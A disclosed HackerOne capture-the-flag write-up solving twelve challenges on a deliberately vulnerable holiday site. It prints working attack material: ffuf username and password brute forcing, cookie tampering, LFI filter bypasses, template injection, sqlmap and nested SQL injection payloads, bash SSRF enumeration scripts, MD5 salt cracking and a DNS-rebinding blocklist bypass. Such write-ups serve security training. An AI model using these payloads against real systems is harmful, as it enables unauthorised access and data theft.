---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/uncontrolled-resource-consumption
  - env/network
substate: "resolved"
weakness: "Uncontrolled Resource Consumption"
enriched: true
date: 2021-01-11
submitted: 2020-12-23T21:27:45.270Z
bounty_usd: null
votes: 4
cve: []
program: "[[programs/h1-ctf|h1-ctf]]"
reporter: "jeti"
source: "https://hackerone.com/reports/1065493"
title: "[CTF] I've DDoSed Grinch Network"
---
# [CTF] I've DDoSed Grinch Network

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 4 | **Program:** h1-ctf | **Disclosed:** 2021-01-11

- Report: [https://hackerone.com/reports/1065493](https://hackerone.com/reports/1065493)
- CWE: Uncontrolled Resource Consumption
- Submitted: 2020-12-23T21:27:45.270Z

## Report summary

# Flag 1

First flag was the most difficult one for me because I always forget checking `robots.txt` file :)

```http
GET /robots.txt HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close


HTTP/1.1 200 OK
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```
### Flag 1: flag{48104912-28b0-494a-9995-a203d1e261e7}

# Flag 2

Web page https://hackyholidays.h1ctf.com/s3cr3t-ar3a was stating *'come back tomorrow'*. So on next day when we visit it we are greeted with following message:
{F1127095}

Let's check the source code. Nothing very exciting... Except this part:
```html
<script src="/assets/js/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
```
All files (CSS, JS) are hosted from Content Delivery Network **except JQuery**. After checking the source code of locally hosted *jquery.min.js* we can find this added code:

```javascript
      , h1_0 = 'la'
      , h1_1 = '}'
      , h1_2 = ''
      , h1_3 = 'f'
      , h1_4 = 'g'
      , h1_5 = '{b7ebcb75'
      , h1_6 = '8454-'
      , h1_7 = 'cfb9574459f7'
      , h1_8 = '-9100-4f91-';
    document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
    document.getElementById('alertbox').setAttribute('next-page', '/ap' + 'ps');
```
That means this part of JS modifies DOM tree with `setAttribute()`.
Let's fire up Dev Tools in Chrome to inspect DOM tree. We can immediately spot this part:
```html
<div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">
                <p>I've moved this page to keep people out!</p>
                <p>If you're allowed access you'll know where to look for the proper page!</p>
            </div>
```

### Flag 2: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}

From now on all flags were new apps published under `/apps`directory.
# Flag 3 - People Rater
{F1127105}
People Rater is an app that presents ratings assigned by Grinch to various people.
When we examine the request made when specific person's rating should be presented on screen we observe this:
```http
GET /people-rater/entry?id=eyJpZCI6NH0= HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close

HTTP/1.1 200 OK

{"id":"eyJpZCI6NH0=","name":"Ruth Ward","rating":"Disgusting"}
```
String with `eyJ` prefix ? That almost always means Base64 encoded JSON!

`base64decode('eyJpZCI6NH0=')` = `{"id":7}`

We can try exploiting classic IDOR and change `id` value and pass it to the application (after base64 encoding):
`base64encode('{"id":0}')` = `eyJpZCI6MX0=`

```html
GET /people-rater/entry?id=eyJpZCI6MX0%3d HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close

HTTP/1.1 200 OK

{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
```
### Flag 3: flag{b705fb11-fb55-442f-847f-0931be82ed9a}

# Flag 4
{F1127124}

Swag Shop app as the name suggests is a shopping application. It heavily rely on API available at https://hackyholidays.h1ctf.com/swag-shop/api.
There are couple of endpoints already visible in javascript:
* /api/login
* /api/stock
* /api/purchase

Quick fuzzing with `ffuf` reveals few more:
```bash
ffuf -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -w ~/wordlists/Web-Content/common.txt -mc all -ac
________________________________________________

 :: Method           : GET
 :: URL              : https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ
________________________________________________

sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
stock                   [Status: 200, Size: 167, Words: 8, Lines: 1]
user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
```

First endpoint `/sessions` reveal interesting session information:
```json
{"sessions":["eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKa[...]",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKa[...]",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKa[...]"
]}
```
All strings are base64 encoded and have similar structure after decoding:
```json
{"user":null,"cookie":"YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0Ym[...]"}
```
One of the strings is different and has non-null `user` field:
```json
{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMW[...]"}
```

Let's check another API endpoint: `/api/user`. When accessed directly it throws an error that params are not defined:
```http
GET /swag-shop/api/user HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close

HTTP/1.1 400 Bad Request

{"error":"Missing required fields"}
```

Fuzzing param names reveal required parameter:
```bash
ffuf -u https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=xxx -w ~/wordlists/Web-Content/burp-parameter-names.txt -mc all -ac
________________________________________________

 :: Method           : GET
 :: URL              : https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=xxx
________________________________________________

uuid                    [Status: 404, Size: 40, Words: 5, Lines: 1]
```

Let's use `user` value retrieved from `/api/sessions` as a value for `uuid` parameter:
 ```http
GET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close

HTTP/1.1 200 OK

{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
```

### Flag 4: flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}

#Flag 5
{F1127212}

## Enumerating username and password
On https://hackyholidays.h1ctf.com/secure-login we are greeted with login screen.
First thing to check on any login screen is if there is a difference in error message when we provide valid username (Invalid username vs. invalid password).
If error message differs and there is no rate limiting on `login` endpoint we can enumerate valid usernames by checking for which users error message will change.

It seems that providing wrong username results in following error message:
{F1127218}

Enumerating usernames with filtering out responses with 'Invalid Username' string:
```
ffuf -u https://hackyholidays.h1ctf.com/secure-login -X POST -d "username=FUZZ&password=1" -w ~/tools/SecLists/Usernames/Names/names.txt -H "Content-Type: application/x-www-form-urlencoded" -mc all -fr "Invalid Use"
________________________________________________

 :: Method           : POST
 :: URL              : https://hackyholidays.h1ctf.com/secure-login
 :: Wordlist         : FUZZ: /home/jeti/tools/SecLists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=1
________________________________________________

access                  [Status: 200, Size: 1724, Words: 464, Lines: 37]
```

Enumerating password:
```
ffuf -u https://hackyholidays.h1ctf.com/secure-login -X POST -d "username=access&password=FUZZ" -w ~/tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -H "Content-Type: application/x-www-form-urlencoded" -mc all -fr "Invalid Pass"

 :: Method           : POST
 :: URL              : https://hackyholidays.h1ctf.com/secure-login
 :: Wordlist         : FUZZ: /home/jeti/tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=access&password=FUZZ
 :: Filter           : Regexp: Invalid Pass
________________________________________________

computer                [Status: 302, Size: 0, Words: 1, Lines: 1]
```

Username: **access**
Password: **computer**

After login we get following message:
{F1127660}

#Access to admin files
When we log in following cookie is assigned:
```
securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=
```
Again we have base64 encoded string:
```
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
```
After changing parameter `admin` to *true* and re-encoding cookie again we get access to admin files:
```http
GET /secure-login HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ%3d%3d

HTTP/1.1 200 OK

[...]
<td><a href="/my_secure_files_not_for_you.zip">my_secure_files_not_for_you.zip</a></td>
```
{F1127760}
## Password protected ZIP
Downloaded Zip file turned out to be password protected.
Let's crack it with good old John the Ripper :)
```shell
$ zip2john my_secure_files_not_for_you.zip > zip.hash
$ john -w rockyou.txt zip.hash --format=pkzip

my_secure_files_not_for_you.zip:hahahaha
```
After unzipping the file we exctract the flag.txt:
```
$ unzip my_secure_files_not_for_you.zip
Archive:  my_secure_files_not_for_you.zip
[my_secure_files_not_for_you.zip] xxx.png password:
  inflating: xxx.png
 extracting: flag.txt

$cat flag.txt
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
```

### Flag5: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}

# Flag 6
{F1127768}
Immediately after visiting My diary app we see that there is a potential for Local File Inclusion (LFI) due to `template` parameter accepting local file name: https://hackyholidays.h1ctf.com/my-diary/?template=entries.html

Changing `template` parameter to `index.php` reveals PHP source code of main page:
```php

<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```
Our goal here is to access source code of `secretadmin.php` page.
Unfortunately there is a mechanism implemented that removes `admin.php` and `secretadmin.php` strings from template parameter.

As specific strings are REMOVED we can construct following string:
* secresecretadmadmin.phpin.phptadmadmin.phpin.php 
* after removing of `admin.php` -> `secresecretadmin.phptadmin.php`
* after removing of secretadmin.php ->  `secretadmin.php`

After visiting URL https://hackyholidays.h1ctf.com/my-diary/?template=secresecretadmadmin.phpin.phptadmadmin.phpin.php
we get access to flag:
{F1127769}

### Flag 6: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}

#Flag 7
{F1127770}
## Templating system
This app uses some kind of templating system to generate hate mailing campaigns.
From existing mailing campaign called `Guess What` we can get information how to include template from external file:
{F1127785}
So it's possible to include external file with `{{template:external_filename}}` syntax.

When we create new campaign and preview it's contents, following request is made:
```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Type: application/x-www-form-urlencoded

preview_markup=Hello {{name}} ....&preview_data={"name":"Alice","email":"alice@test.com"}

HTTP/1.1 200 OK

Hello Alice....
```

## Template directory
When we change `preview_markup` parameter and instruct the server to include non existing external template:
```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
[...]

preview_markup=Hello {{template:nonexistent}} ....&preview_data={"name":"Alice","email":"alice@test.com"} 

HTTP/1.1 200 OK
Cannot find template file /templates/nonexistent
```
Which reveals that `/templates` directory exists. Let's check its contents (luckily directory listing is enabled):
{F1127790}

It is not possible to access those files directly (403 Forbidden).
## Template Injection
Also it is not possible to access file `38dhs_admins_only_header.html` via including it as a template:
```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close

preview_markup=Hello {{template:38dhs_admins_only_header.html }} ....&preview_data={"name":"Alice","email":"alice@test.com"} 
```
as we get following response:
```http
HTTP/1.1 200 OK
Connection: close
Content-Length: 64

You do not have access to the file 38dhs_admins_only_header.html
```

But it seems that when we inject template command into `preview_data` parameter this command will be evaluated without restrictions:
```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com

preview_markup=Hello {{name}} ....&preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
```
response:
```html
Hello <html>
<body>
<center>
    <table width="700">
        <tr>
            <td height="80" width="700" style="background-color: #64d23b;color:#FFF" align="center">Grinch Network Admins Only</td>
        </tr>
        <tr>
            <td style="padding:20px 10px 20px 10px">
                <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4> ....
```
### Flag 7: flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}

# Flag 8

Grinch started a forum. It seems that our goal here is to login as admin and read posts from admin only section.

## GitHub repository
It turned out that this flag required some OSINT skills. When checking Adam Langley (CTF author) GitHub account
https://github.com/adamtlangley we can spot that his last commit was done on `GrinchNetworks/forum` repository:
{F1128318}

This repository contains whole source code of Grinch Forum app.
Next thing is to analyze how application works and also to analyze commit history. Sometimes developers push sensitive data (credentials, API keys) with the code. 

And in fact  in one of the commits we can see that Adam removed database credentials:
{F1128338}

* DB User: forum
* DB Password: 6HgeAZ0qC9T6CQIqJpD

## Phpmyadmin
Quick directory fuzzing reveals that there is `phpmyadmin` installed here: https://hackyholidays.h1ctf.com/forum/phpmyadmin. Lets try to login with leaked DB credentials.

We were able to login with those credentials and we have access to `forum` database and `user` table:
{F1128359}

We can see that user `grinch` is an admin and we have access to hash of his password:
**35D652126CA1706B59DB02C93E0C9FBF**

## Password hash
Quick check on https://crackstation.net/ reveals that this hash was already cracked:
{F1128363}
And `grinch` password is `BahHumbug`

## Login as admin
Using above credentials we can log in as admin and reveal the flag:
{F1128432}

### Flag 8: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
# Flag 9
{F1129138}
Evil Quiz is an application where user:
1. Provides his name
2. Answers some quiz questions.
3. Gets his score.

Again, probably the goal here is to log in as admin.
A careful eye can spot information about number of users having the same name as name provided by user in Step 1. This is probably put there intentionally as a feedback for some vulnerability. After some basic checks It turned out that this assumption was correct. Name parameter is vulnerable to SQL injection:
True statement:
{F1129639}

False statement:
{F1129639}

So this is second order blind boolean sql injection. I guess the intention of CTF autor was to prevent automatic tools like `sqlmap` to find this vulnerability and in fact those tools won't be able to find it.

But when we know how to trigger the vulnerability we can use the power of  `sqlmap` to ex-filtrate the database.
`sqlmap` is able to check for second order SQL injections with use of `--second-url` and `--second-req` parameters.

Also we can specify that this is boolean injection type `--technique=B` and provide the response representing false condition with `--not-string`. To make it easy for `sqlmap` to locate specific parameters we will provide two HTTP requests (one for sending the payload (`-r`) and second for retrieving the response (`--second-req`):
```shell
$ sqlmap -r evil-quiz1.req --second-req=evil-quiz2.req --not-string="There is 0" --technique=B -D quiz -T admin -C password --dump

[22:18:59] [INFO] parsing HTTP request from 'evil-quiz1.req'
[22:18:59] [INFO] parsing second-order HTTP request from 'evil-quiz2.req'
[22:18:59] [INFO] resuming back-end DBMS 'mysql'
[22:18:59] [INFO] testing connection to the target URL

Parameter: name (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: name=grinch' AND 9363=9363 AND 'mRVl'='mRVl
---
[22:19:34] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12
[22:19:34] [INFO] fetching entries of column(s) '`password`' for table 'admin' in database 'quiz'
[22:19:34] [INFO] fetching number of column(s) '`password`' entries for table 'admin' in database 'quiz'
[22:19:34] [INFO] resumed: 1
[22:19:34] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[22:19:34] [INFO] retrieved:
[22:19:38] [WARNING] reflective value(s) found and filtering out
S3creT_p4ssw0rd-$
Database: quiz
Table: admin
[1 entry]
+-------------------+
| password          |
+-------------------+
| S3creT_p4ssw0rd-$ |
+-------------------+
```
We found admin password. After login in we get the flag:
{F1129717}

### Flag 9: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}

# Flag 10 - Signup Manager
On Signup Manager user name register his account and after approval he will become a member of Grinch Army.

## Comment left by developer
After checking page source code we can spot a comment left by developer:
```html
 <!-- See README.md for assistance -->
```
Content of this *README.md*:
> **SignUp Manager**
> 
> SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.
> 
> **How to Install**
> 1) Create a directory that you wish SignUp Manager to be installed into
> 2) Move signupmanager.zip into the new directory and unzip it.
> 3) For security move users.txt into a directory that cannot be read from website visitors
> 4) Update index.php with the location of your users.txt file
> 5) Edit the user and admin php files to display your hidden content
> 6) You can make anyone an admin by changing the last character in the users.txt file to a Y
> 7) Default login is admin / password

## Access to source code
*README.md* file mentioned `signupmanager.zip` file. Let's download it:
```bash
wget https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip
unzip signupmanager.zip
  inflating: README.md
  inflating: admin.php
  inflating: index.php
  inflating: signup.php
  inflating: user.php
```

## Source code review

After reviewing source code we see that usernames are stored in `users.txt` where each user record occupies one line of exactly 113 characters. format is as follows:
{F1129772}
where numbers in square brackets describe how many characters each field occupy.
Last character (#113) gives info if created user is an admin or not but regular user doesn't have control over this field. It's always defined as 'N' (not admin).

The idea to exploit this app is to overflow somehow the line construction algorithm and store character 'Y' in the last byte of the line.

It seems that all parts of the line are properly padded/truncated to their max length... Except `Age` which is `integer`.
Here is the part of the code that checks this parameter:
```php
            if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
```
We can see that first it checks if we are dealing with a string containing numeric value, if doesn't contain more than 3 chars and THEN it is converted to integer.

The problem is that PHP accepts different number notations. E.g. notation *1e3* is perfectly fine for PHP and after conversion it will become `1000`.

That is how we can overflow this line creation algorithm. Setting `age=1e3` passes all the checks: it is a number, it's exactly 3 characters long. And after conversion we have a number that is 4 characters long!

Let's sign up with following request:
```http
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Type: application/x-www-form-urlencoded

action=signup&username=account123&password=password&age=1e3&firstname=XXX&lastname=YYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
```
`Age` parameter contains our malicious number. `Lastname` contains a lot of 'Y' characters to overflow the Admin field.

The result is a response with a session Cookie:
```http
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 25 Dec 2020 15:05:37 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: token=d843a6e76ee8a818f5429498c4337a23; expires=Fri, 25-Dec-2020 16:05:37 GMT; Max-Age=3600
Location: /signup-manager/
Content-Length: 0
```
When we refresh main page with this cookie set we get the flag:
{F1129788}
### Flag 10: flag{99309f0f-1752-44a5-af1e-a03e4150757d}

# Flag 11 - Recon Server
This challenge starts from hidden directory (available after solving challenge 10) https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59

Couple of observed things:
1. Call to `/album?hash=jdh34k` endpoint will response with links to `/picture` endpoint witch retrieves pictures from the server
2. `/picture` endpoint accepts `data` parameter that is base64 encoded JSON:
```json
{"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
```
3. User cannot tamper with `image` parameter as this is protected by `auth` signature.
4. There is an `/api` endpoint but any call results in an error: `{"error":"This endpoint cannot be visited from this IP address"}`

## First SQL Injection
It turned out ``/album?hash=` parameter is vulnerable to SQL injection.
Following request:
```http
GET /r3c0n_server_4fdk59/album?hash=c'+UNION+ALL+SELECT+1,2,3--+- HTTP/1.1
```

responds with:

```html
<img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzBhMzgyYzYxNzdiMDQzODZlMWE0NWNlZWFhODEyZTRlLmpwZyIsImF1dGgiOiJlYzVhOTkyMGUxNzdjY2M4NDk3NDE0NmY5M2FlMDRiMCJ9">
```
which is a request for image `0a382c6177b04386e1a45ceeaa812e4e.jpg`.

## SQLi inside SQLi
Interesting point is that for those two payloads:

* `UNION ALL SELECT 1,2,3`
* `UNION ALL SELECT 2,2,3`

we get different results (different images filenames).

That means value of first column is probably used to retrieve the file name from the database. We can imagine the pseudo code like this:
```
($file_id, $col3, $col_3) = SELECT file_id, col_2, col_3 FROM fileIdTable
($file_name) = SELECT file_name FROM files WHERE file_id=$file_id
```
So maybe we could put there second SQLi to force second query to respond with string under our control. After some fiddling this payload did the trick:
`UNION ALL SELECT "-1' union all select NULL,NULL,'A'-- -",2,3-- -`

```http
GET /r3c0n_server_4fdk59/album?hash='+UNION+ALL+SELECT+"-1'+union+all+select+NULL,NULL,'A'--+-",2,3--+- HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
```
Results in response:
```
{"image":"r3c0n_server_4fdk59\/uploads\/A","auth":"60146c0f9a44a825faa23e2dd179c13d"}
```
So now we are in control of filename!

## Path traversal and SSRF
As we can control the path that is retrieved by the server maybe we can access the `/api` endpoint that was not accessible before.

To speed up the process of performing SQLi and retrieving the data following bash script was used:
```bash
#!/bin/bash

url=$(curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album\?hash=\'+UNION+ALL+SELECT+\"-1\'+union+all+select+NULL,NULL,\'${1}\'--+-\",2,3--+- -s|grep data= |sed 's/^.*src="\([^"]*\)">/\1/')
curl -s "https://hackyholidays.h1ctf.com$url"
echo
```
Script usage:
```shell
./sqlinception.sh some_path
Expected HTTP status 200, Received: 404
```
That means that we performed an SSRF request but application expected return code 200 but got 404.
Let's check what will be retrieved when we hit existing path:
To access main page we can use path traversal:

```shell
./sqlinception.sh ..
Invalid content type detected
```
That means system returned code 200 but content type was not an image (as we call an endpoint that is used to retrieve images, probably it expects `image/*` content type.

Also we have access to API now:
```shell
./sqlinception.sh ../api/x
Expected HTTP status 200, Received: 404
```
We didn't get 401 Unathorized but 404 Not found.

## API endpoint enumeration
With a bit of bash automation a we can enumerate API endpoints:
```bash
while read word
  do echo -n $word:
  bash sqlinception.sh ../api/$word
done <wordlist.txt |grep -v 404
```
Following endpoints returned *Invalid content type detected* instead of *error 404*:
* /api/user
* /api/ping

## API parameter enumeration
When we try to pass some parameters to /api/user endpoint we get error 400:
```shell
./sqlinception.sh ../api/user\?a=1
Expected HTTP status 200, Received: 400
```

According to API "documentation" from the `/api` page:
{F1129906}
Error 400 means param name is invalid. Again we can enumerate valid params:
```bash
while read word
  do echo -n $word:
  bash sqlinception.sh ../api/user\?$word=1
done <wordlist.txt |grep -v 400
```

Valid parameters found:
* username
* password

## User enumeration
When we call `/api/user` endpoint with parameter `username` set to something random we get error code 204 (Successful request but no data found).
```shell
./sqlinception.sh ../api/user\?username=xx
Expected HTTP status 200, Received: 204
```

But after some fuzzing with different characters it turned out that response is different when `%` sign is used:
```shell
./sqlinception.sh ../api/user\?username=%
Invalid content type detected
```
Immediate idea was that maybe username is passed to SQL query into LIKE statement. And maybe we can find the username by sequentialy checking responses to `a%`, `b%` etc.
Again bash script helped:
```bash
prevchar=''
while true; do
    for char in {{a..z},{0..9},{A..Z}}; do
        ./sqlinception.sh ../api/user\?username=$prevchar$char% |grep -q -v 204
        if [ $? -eq 0 ]; then
             echo -n $char
             prevchar=$prevchar$char
             break
       fi
    done
done
```
result is: **grinchadmin**

We can also enumerate password as this is working exactly the same with `%` sign:
```bash
while true; do
    for char in {{a..z},{0..9},{A..Z}}; do
        ./sqlinception.sh ../api/user\?password=$prevchar$char% |grep -q -v 204
        if [ $? -eq 0 ]; then
             echo -n $char
             prevchar=$prevchar$char
             break
       fi
    done
done
```
Result: **s4nt4sucks**

Now we have admin credentials and we can log in into **Attack Box** https://hackyholidays.h1ctf.com/attack-box/login

{F1130002}

### Flag 11: flag{07a03135-9778-4dee-a83c-7ec330728e72}

# Flag 12
We have access to Grinch Network Attack server. Our goal is to perform DDoS attack on Grinch own network using his attack server.

There are three IP addresses to attack. When attack is initiated following request is made:
```http
GET /attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ== HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cookie: attackbox=d0xxxxxxxxxx75e0199a5e91dde9687
```

where `payload` parameter holds base64 encoded JSON string:
```json
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

## Cracking the salt
So we have a MD5 signature that protects the `target` parameter. Any change in signature or target param results in an error.

But having both message (IP address in this case) and a hash we could try to bruteforce the salt that is usually appended to message before hashing (as `hash = md5(salt+message)`).

First we need to prepare a wordlist of salt+message:
```bash
cat rockyou.txt | awk '{print $0"203.0.113.33"}' > wordlist.txt
```
Next we need to match known MD5 hash to each hashed wordlist item (fastest way is to use `hashcat`):
```bash
echo 5f2940d65ca4140cc18d0878bc398955 > hash.txt
hashcat -m 0 -a 0 hash.txt wordlist.txt
```

Hashcat quickly finds matching hash:
```
5f2940d65ca4140cc18d0878bc398955:mrgrinch463203.0.113.33

Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: 5f2940d65ca4140cc18d0878bc398955
Time.Started.....: Fri Dec 25 22:03:10 2020 (1 sec)
Time.Estimated...: Fri Dec 25 22:03:11 2020 (0 secs)
Guess.Base.......: File (list.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:  4458.6 kH/s (0.58ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 5357568/14343893 (37.35%)
Rejected.........: 0/5357568 (0.00%)
Restore.Point....: 5349376/14343893 (37.29%)
Candidates.#1....: mrkr2518203.0.113.33 -> mpisti88203.0.113.33
HWMon.Dev.#1.....: N/A
```
md5 salt: **mrgrinch463**

## Changing IP address
Having a salt we can sign our own messages. As the goal of final challenge is to DDoS Grinch, obvious selection would be to change IP address to 127.0.0.1:
```bash
echo -n mrgrinch463127.0.0.1 | md5sum -
3e3f8df1658372edf0214e202acb460b
```
Next we launch DDoS attack with following payload:
```
json:
{"target":"127.0.0.1","hash":"c4d677f60c076b72bb28d2051c76831a"}

base64 encoded: 
eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==
```

Final URL: https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==

Result: 
{F1130044}

Unfortunately our attack on localhost was detected.

## Localhost check bypass
One thing that was observed during initial recon phase was that `target` parameter accepts also hostnames.
Unfortunately testing all kinds of localhost check bypasses:
* using hostname pointing to 127.0.0.1 like http://localtest.me
* using different IP notations

all failed.

That means hostnames are resolved and IP address is checked against the blacklist.

But we can try to use **DNS rebinding attack** where we put DNS service that resolves the same hostname to two different IP addresses in sequence (also setting very short TTL to prevent caching of DNS responses).

If application first resolves hostname to check against blacklist but then resolves it again to perform an action, we can bypass first check by providing valid IP. Second DNS request will resolve to malicious IP.

This is quite easy to achieve with online services like https://lock.cmpxchg8b.com/rebinder.html.

We can specify two IP addresses and service will prepare DNS rebinding attack:
{F1130059}

Service generated following hostname:  7f000001.cb007121.rbndr.us

Let's construct the payload:
```
echo -n mrgrinch4637f000001.cb007121.rbndr.us | md5sum
54171d97f5299ef84c1c01a676eaa917  -

json:
{"target":"7f000001.cb007121.rbndr.us","hash":"54171d97f5299ef84c1c01a676eaa917"}

base64 encoded: 
eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jYjAwNzEyMS5yYm5kci51cyIsImhhc2giOiI1NDE3MWQ5N2Y1Mjk5ZWY4NGMxYzAxYTY3NmVhYTkxNyJ9
```

Final URL: https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jYjAwNzEyMS5yYm5kci51cyIsImhhc2giOiI1NDE3MWQ5N2Y1Mjk5ZWY4NGMxYzAxYTY3NmVhYTkxNyJ9

Video PoC:
{F1130072}

### Flag 12: flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}

## Timeline

- **Report Filed**
- **Report Triaged**
- **2021-01-04** @nahamsec: Hello!

Happy new year and congratulations on being one of the first 10 hackers to solve the 12 Days of Hacky Holidays! If you'd like to receive a HackerOne care package, please email your full name, address, email address and phone number to █████████@hackerone.com 

Thanks,
Ben
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
